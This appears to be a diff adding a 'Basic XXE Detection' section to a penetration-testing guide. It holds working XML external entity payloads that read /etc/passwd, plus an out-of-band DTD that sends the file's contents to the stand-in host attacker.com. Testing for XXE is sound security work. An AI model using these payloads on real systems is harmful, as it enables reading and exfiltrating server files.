@@ -1,0 +1,27 @@
+**Phase 2: Basic XXE Detection**
+- **In-band XXE (File Read)**:
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE test [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  ]>
+  <root>&xxe;</root>
+  ```
+- **Out-of-band XXE (OOB)**:
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE test [
+    <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+    %xxe;
+  ]>
+  <root>&exfil;</root>
+  ```
+  evil.dtd:
+  ```dtd
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+  %eval;
+  ```
+- **Blind XXE**:
+  - Trigger DNS/HTTP request to attacker server
+  - Use `http://attacker.com/?data=` with parameter entities
